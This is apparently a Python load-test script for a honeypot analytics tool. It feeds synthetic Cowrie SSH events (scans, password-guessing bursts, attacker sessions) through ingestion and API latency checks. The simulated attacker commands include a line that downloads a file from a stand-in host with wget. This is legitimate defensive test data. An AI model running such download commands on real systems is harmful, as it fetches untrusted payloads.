"""Load test at the event cap with synthetic, documentation-range traffic. No network activity.

    python -m aegis.loadtest --events 50000 --out data/loadtest

Measures live-style ingestion (500-event batches with incremental detection after each commit), a full
detection and statistics recompute, and API latency (p50/p95) for the main read endpoints."""
import argparse
import json
import random
import statistics
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

from aegis.ingestion import make_record

BASE = datetime(2026, 1, 1, tzinfo=timezone.utc)
NETS = ("192.0.2.", "198.51.100.", "203.0.113.")


def traffic(target, seed=1):
    """A mix like the real sensor: mostly scanner sessions, some guessing bursts, a few interactive sessions."""
    rng, events, t, n = random.Random(seed), [], 0.0, 0
    while len(events) < target:
        n += 1
        ip, session, kind = rng.choice(NETS) + str(rng.randint(1, 254)), f"lt{n}", rng.random()
        add = lambda dt, eventid, **fields: events.append(dict(timestamp=(BASE + timedelta(seconds=t + dt)).isoformat(), eventid=eventid,
                                                            sensor="load-sensor", session=session, src_ip=ip, **fields))
        add(0, "cowrie.session.connect", src_port=rng.randint(1024, 65535), dst_ip="198.51.100.1", dst_port=22, protocol="ssh")
        if kind < 0.80:
            add(0.2, "cowrie.client.version", version="SSH-2.0-Go")
            add(0.4, "cowrie.session.closed", duration_ms=rng.randint(0, 900))
        elif kind < 0.95:
            for k in range(rng.randint(3, 12)):
                add(1 + k, "cowrie.login.failed", username=rng.choice(("root", "admin", "test", "ubuntu", "pi")), password="x")
            add(15, "cowrie.session.closed", duration_ms=15000)
        else:
            add(1, "cowrie.login.success", username="root", password="x")
            for k in range(rng.randint(1, 6)):
                add(2 + k, "cowrie.command.input", input=rng.choice(("uname -a", "cat /proc/cpuinfo", "echo ok", "wget http://x.example/a")))
            add(20, "cowrie.session.closed", duration_ms=20000)
        t += rng.expovariate(1 / 6)
    return events[:target]


def percentile(values, q):
    ordered = sorted(values)
    return round(ordered[min(len(ordered) - 1, int(q * len(ordered)))] * 1000, 1)


def run(target, out):
    from app import create_app, runtime_settings
    out = Path(out)
    out.mkdir(parents=True, exist_ok=False)
    app = create_app(out / "load.sqlite3", settings=runtime_settings({}))
    store, analyzer = app.extensions["store"], app.extensions["analyzer"]
    records = [make_record(json.dumps(e).encode(), "live", f"offset:{i}") for i, e in enumerate(traffic(target))]
    started = time.perf_counter()
    batch_times = []
    for start in range(0, len(records), 500):
        t0 = time.perf_counter()
        part = records[start:start + 500]
        store.commit(part, dict(mode="live", source_id="load", source_type="cowrie", file_id="load"))
        analyzer.after_live_commit(part)
        batch_times.append(time.perf_counter() - t0)
    ingest_seconds = time.perf_counter() - started
    t0 = time.perf_counter()
    analyzer.analyze("live")
    analyzer.statistics("live")
    recompute_seconds = time.perf_counter() - t0

    client = app.test_client()
    session_id = records[len(records) // 2]["event"]["session"]
    endpoints = {"overview": "/api/overview?source=live", "events page": "/api/events?source=live&limit=50&page=10",
                 "filtered events": "/api/events?source=live&event_type=auth_failure&limit=50",
                 "incidents": "/api/v1/incidents?source=live&limit=25", "findings": "/api/v1/findings?source=live&limit=50",
                 "session timeline": f"/api/v1/sessions/{session_id}/timeline?source=live",
                 "statistics": "/api/v1/statistics?source=live", "series (hourly)": "/api/v1/statistics/series?source=live&bucket=3600",
                 "metrics": "/api/v1/metrics"}
    latency = {}
    for name, path in endpoints.items():
        timings = []
        for _ in range(15):
            t0 = time.perf_counter()
            response = client.get(path)
            timings.append(time.perf_counter() - t0)
            assert response.status_code == 200, (path, response.status_code)
        latency[name] = {"p50_ms": percentile(timings, 0.5), "p95_ms": percentile(timings, 0.95)}
    overview = client.get("/api/overview?source=live").get_json()
    result = {"events": len(records), "sessions": len({r["event"]["session"] for r in records}),
              "incidents": len(overview["incidents"]), "findings_active": sum(c["count"] for c in overview["finding_counts"]),
              "ingest": {"seconds": round(ingest_seconds, 2), "events_per_second": round(len(records) / ingest_seconds),
                         "batch_p50_ms": percentile(batch_times, 0.5), "batch_p95_ms": percentile(batch_times, 0.95)},
              "full_recompute_seconds": round(recompute_seconds, 2), "api_latency": latency,
              "database_mb": round((out / "load.sqlite3").stat().st_size / 1e6, 1), "chain_valid": store.verify_chain()["valid"]}
    (out / "result.json").write_text(json.dumps(result, indent=2))
    return result


def main(argv=None):
    parser = argparse.ArgumentParser(description="Aegis load test with synthetic traffic.")
    parser.add_argument("--events", type=int, default=50000)
    parser.add_argument("--out", required=True)
    args = parser.parse_args(argv)
    print(json.dumps(run(args.events, args.out), indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
